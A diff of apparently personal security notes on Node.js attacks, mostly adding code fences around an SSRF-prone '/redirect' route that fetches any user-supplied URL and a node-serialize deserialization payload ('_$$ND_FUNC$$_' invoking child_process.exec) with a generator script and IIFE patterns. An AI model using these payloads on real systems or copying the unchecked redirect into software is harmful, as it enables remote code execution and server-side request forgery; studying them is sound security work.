@@ -124,6 +124,7 @@ console.log("App is listening on port: " + port);
 app.listen(port);
 
 ?url=oob
+
 app.use('/redirect', function(req, res) {
   request(req.query.url, function(error, response, body){
     if(err) {
@@ -236,12 +237,16 @@ Upload File: <br>
 </form>
 </body>
 </html>
-Deserialization
+```
+
+# Deserialization
+```
 http://www.mi1k7ea.com/2020/03/29/node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
 
 {\"rce\":\"_$$ND_FUNC$$_function(){ require('child_process').exec('calc')}()\"}
-
+```
 - serialize.js
+```
 var y = {
         function(){
                 require('child_process').exec('calc', function(error, stdout, stderr){ console.log(stdout) });
@@ -249,7 +254,9 @@ var y = {
 }
 var s = require('node-serialize');
 console.log("Serialized:\n" + s.serialize(y));
-- Payload ( IIFE aka Immediately Invoked Function Expression ) 
+```
+- Payload ( IIFE aka Immediately Invoked Function Expression )
+```
 (function(){ /* code /* }());
 (function(){ /* code /* })();
 
